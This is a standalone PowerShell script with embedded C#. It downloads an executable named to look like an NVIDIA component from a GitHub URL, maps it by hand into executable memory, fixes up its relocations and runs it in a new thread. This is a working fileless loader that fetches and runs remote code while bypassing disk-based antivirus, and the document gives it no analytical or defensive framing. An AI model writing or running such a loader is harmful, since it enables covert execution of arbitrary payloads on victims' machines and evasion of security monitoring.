$url = 'https://raw.githubusercontent.com/whatsabypass/exe/master/nvidiacontainer.exe'
$bytes = (New-Object Net.WebClient).DownloadData($url)

$code = @"
using System;
using System.Runtime.InteropServices;
public class Loader {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr e, IntPtr p, uint f, IntPtr i);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);

    public static void Run(byte[] pe) {
        int e_lfanew = BitConverter.ToInt32(pe, 0x3C);
        uint imageBase   = BitConverter.ToUInt32(pe, e_lfanew + 0x34);
        uint sizeOfImage = BitConverter.ToUInt32(pe, e_lfanew + 0x50);
        uint ep_rva      = BitConverter.ToUInt32(pe, e_lfanew + 0x28);

        IntPtr mem = VirtualAlloc(IntPtr.Zero, sizeOfImage, 0x3000, 0x40);

        int sizeOfHeaders = BitConverter.ToInt32(pe, e_lfanew + 0x54);
        Marshal.Copy(pe, 0, mem, sizeOfHeaders);

        int numSections = BitConverter.ToInt16(pe, e_lfanew + 0x06);
        int sizeOfOptHdr = BitConverter.ToInt16(pe, e_lfanew + 0x14);
        int sectionOffset = e_lfanew + 24 + sizeOfOptHdr;
        for (int i = 0; i < numSections; i++) {
            int off = sectionOffset + i * 40;
            uint vaddr  = BitConverter.ToUInt32(pe, off + 12);
            uint rawOff = BitConverter.ToUInt32(pe, off + 20);
            uint rawSz  = BitConverter.ToUInt32(pe, off + 16);
            if (rawSz == 0) continue;
            IntPtr dest = new IntPtr(mem.ToInt64() + vaddr);
            Marshal.Copy(pe, (int)rawOff, dest, (int)rawSz);
        }

        long delta = mem.ToInt64() - (long)imageBase;
        if (delta != 0) {
            uint relocRVA  = BitConverter.ToUInt32(pe, e_lfanew + 0xB0);
            uint relocSize = BitConverter.ToUInt32(pe, e_lfanew + 0xB4);
            long relocPtr  = mem.ToInt64() + relocRVA;
            long relocEnd  = relocPtr + relocSize;
            while (relocPtr < relocEnd) {
                uint pageRVA   = (uint)Marshal.ReadInt32((IntPtr)relocPtr);
                uint blockSize = (uint)Marshal.ReadInt32((IntPtr)(relocPtr + 4));
                if (blockSize == 0) break;
                int entries = (int)((blockSize - 8) / 2);
                for (int i = 0; i < entries; i++) {
                    ushort entry = (ushort)Marshal.ReadInt16((IntPtr)(relocPtr + 8 + i * 2));
                    int type = entry >> 12;
                    int roff = entry & 0xFFF;
                    if (type == 10) {
                        IntPtr patchAddr = new IntPtr(mem.ToInt64() + pageRVA + roff);
                        long orig = Marshal.ReadInt64(patchAddr);
                        Marshal.WriteInt64(patchAddr, orig + delta);
                    }
                }
                relocPtr += blockSize;
            }
        }

        IntPtr epAddr = new IntPtr(mem.ToInt64() + ep_rva);
        IntPtr t = CreateThread(IntPtr.Zero, 0, epAddr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, 0xFFFFFFFF);
    }
}
"@

Add-Type -TypeDefinition $code -Language CSharp
[Loader]::Run($bytes)